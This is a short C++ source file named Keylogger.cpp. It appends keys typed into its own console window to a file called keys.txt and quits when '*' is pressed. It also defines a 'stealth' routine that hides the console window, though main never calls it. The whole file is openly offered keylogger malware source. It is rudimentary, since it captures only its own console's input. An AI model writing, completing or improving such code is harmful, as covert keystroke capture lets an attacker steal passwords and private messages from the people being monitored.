// Keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <iostream>
using namespace std;

void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth, 0);
}

int main()
{
	int ch,cha;
	FILE *fptr;
	while (1)
	{
		if (_kbhit())
		{
			ch = _getch();
			cha = ch;
			fptr = fopen("keys.txt", "a+");
			fputc(ch, fptr);
			fclose(fptr);
			if (cha == 42)
			{
				return 0;
			}
		}
	}
}

